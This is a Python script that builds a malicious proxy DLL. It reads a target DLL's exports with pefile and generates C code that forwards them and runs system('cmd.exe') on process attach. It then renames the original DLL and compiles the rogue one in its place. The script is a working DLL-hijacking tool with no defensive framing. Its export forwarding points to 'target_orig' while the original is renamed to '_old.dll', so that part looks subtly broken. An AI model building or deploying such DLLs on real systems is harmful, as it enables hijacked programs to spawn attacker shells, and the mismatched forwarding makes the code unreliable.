import pefile
import sys
import os

dll = pefile.PE(sys.argv[1])
pragmas=""
print("EXPORTS")
for export in dll.DIRECTORY_ENTRY_EXPORT.symbols:
    if export.name:
        pragmas += '\n#pragma comment(linker,"/export:{}=target_orig.{} @{}"'.format(export.name.decode(), export.name.decode(), export.ordinal)

code = """
#include <windows.h>
#include <stdio.h>
"""+pragmas+"""
BOOL WINAPI DllMain(HANDLE hModule, DWORD  fdwReason, LPVOID lpReserved)
{
              switch(fdwReason)
        {
                case DLL_PROCESS_ATTACH:
                        puts("Do process-specific initialization...");
                        system("cmd.exe");
                        break;
                case DLL_THREAD_ATTACH:
                        puts("Do thread-specific initialization...");
                        break;
                case DLL_THREAD_DETACH:
                        puts("Do thread-specific cleanup...");
                        break;
                case DLL_PROCESS_DETACH:
                        puts("Perform any necessary cleanup...");
                        break;
        }
        return TRUE;

}
"""
with open("maldll.c","w") as f:
    f.write(code)


newfile = sys.argv[1].split(".")
newfile = newfile[0]+'_old.dll'

os.system("mv "+sys.argv[1]+" "+newfile)
os.system('x86_64-w64-mingw32-gcc-win32 -o {} maldll.c -shared'.format(sys.argv[1]))
